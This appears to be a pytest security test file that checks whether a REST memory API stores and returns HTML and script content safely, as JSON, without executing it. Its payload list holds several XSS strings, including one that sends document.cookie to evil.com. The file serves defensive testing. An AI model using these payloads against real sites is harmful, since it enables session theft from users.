# Copyright 2024 Heinrich Krupp
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0

"""XSS / injection tests for the REST API.

Verifies that user-supplied content with script tags or HTML is stored
and retrieved safely — no execution context, correct Content-Type headers,
and the payload survives round-trip intact (defense-in-depth, not sanitization).
"""

import uuid

import pytest

# Fixtures (temp_db, initialized_storage, authed_client) are provided by
# tests/security/conftest.py

# --- XSS payloads ---
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "javascript:alert('xss')",
    "<iframe src='javascript:alert(`xss`)'></iframe>",
    "<body onload=alert('xss')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>document.cookie</script>",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<details open ontoggle=alert('xss')>",
]


@pytest.mark.integration
class TestXSSInMemoryContent:
    """XSS payloads in memory content must be stored and retrieved safely."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_store_xss_payload(self, authed_client, payload):
        """Storing XSS payloads must succeed — content is stored as-is."""
        uid = uuid.uuid4().hex[:8]
        response = authed_client.post(
            "/api/memories",
            json={
                "content": f"XSS test {uid}: {payload}",
                "tags": ["__test__", "xss"],
            },
        )
        assert response.status_code in (200, 201), response.text

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_retrieve_xss_payload_intact(self, authed_client, payload):
        """Retrieved content must contain the payload unchanged (no sanitization)."""
        uid = uuid.uuid4().hex[:8]
        content = f"Round-trip XSS test {uid}: {payload}"
        tag = f"xss-rt-{uid}"
        store_resp = authed_client.post(
            "/api/memories",
            json={"content": content, "tags": ["__test__", tag]},
        )
        assert store_resp.status_code in (200, 201)

        # Retrieve via tag search (deterministic, unlike semantic search with hash embeddings)
        search_resp = authed_client.post(
            "/api/search/by-tag",
            json={"tags": [tag], "match_all": False},
        )
        assert search_resp.status_code == 200
        results = search_resp.json().get("results", [])
        assert len(results) > 0, f"No results found for tag {tag}"
        # The payload should be in the content (stored as plain text, not executed)
        found = any(
            payload in r.get("memory", {}).get("content", r.get("content", ""))
            for r in results
        )
        assert found, f"XSS payload not found in search results: {payload}"

    def test_api_response_content_type_is_json(self, authed_client):
        """API responses must have application/json Content-Type."""
        uid = uuid.uuid4().hex[:8]
        response = authed_client.post(
            "/api/memories",
            json={
                "content": f"<script>alert('xss')</script> {uid}",
                "tags": ["__test__"],
            },
        )
        assert response.status_code in (200, 201)
        content_type = response.headers.get("content-type", "")
        assert "application/json" in content_type, (
            f"Expected application/json, got: {content_type}"
        )

    def test_search_response_content_type_is_json(self, authed_client):
        """Search responses must have application/json Content-Type."""
        authed_client.post(
            "/api/memories",
            json={"content": "Memory for content-type test", "tags": ["__test__"]},
        )
        response = authed_client.post(
            "/api/search",
            json={"query": "content-type test", "n_results": 5},
        )
        assert response.status_code == 200
        content_type = response.headers.get("content-type", "")
        assert "application/json" in content_type

    def test_xss_in_tags_stored_safely(self, authed_client):
        """XSS payloads in tags must be stored without execution."""
        uid = uuid.uuid4().hex[:8]
        payload = "<script>alert('tag-xss')</script>"
        response = authed_client.post(
            "/api/memories",
            json={
                "content": f"Tag XSS test {uid}",
                "tags": ["__test__", payload],
            },
        )
        assert response.status_code in (200, 201), response.text

    def test_xss_in_metadata_stored_safely(self, authed_client):
        """XSS payloads in metadata values must be stored without execution."""
        uid = uuid.uuid4().hex[:8]
        payload = "<img src=x onerror=alert('meta-xss')>"
        response = authed_client.post(
            "/api/memories",
            json={
                "content": f"Metadata XSS test {uid}",
                "tags": ["__test__"],
                "metadata": {"html_field": payload},
            },
        )
        assert response.status_code in (200, 201), response.text

    def test_health_endpoint_returns_json(self, authed_client):
        """Health endpoint must return JSON, not HTML."""
        response = authed_client.get("/api/health")
        assert response.status_code == 200
        content_type = response.headers.get("content-type", "")
        assert "application/json" in content_type

    def test_openapi_schema_does_not_contain_reflected_xss(self, authed_client):
        """OpenAPI schema must not reflect user input."""
        response = authed_client.get("/openapi.json")
        assert response.status_code == 200
        data = response.json()
        # The schema should be well-formed JSON, no script tags in it
        import json
        serialized = json.dumps(data)
        assert "<script" not in serialized.lower(), "Script tag found in OpenAPI schema"
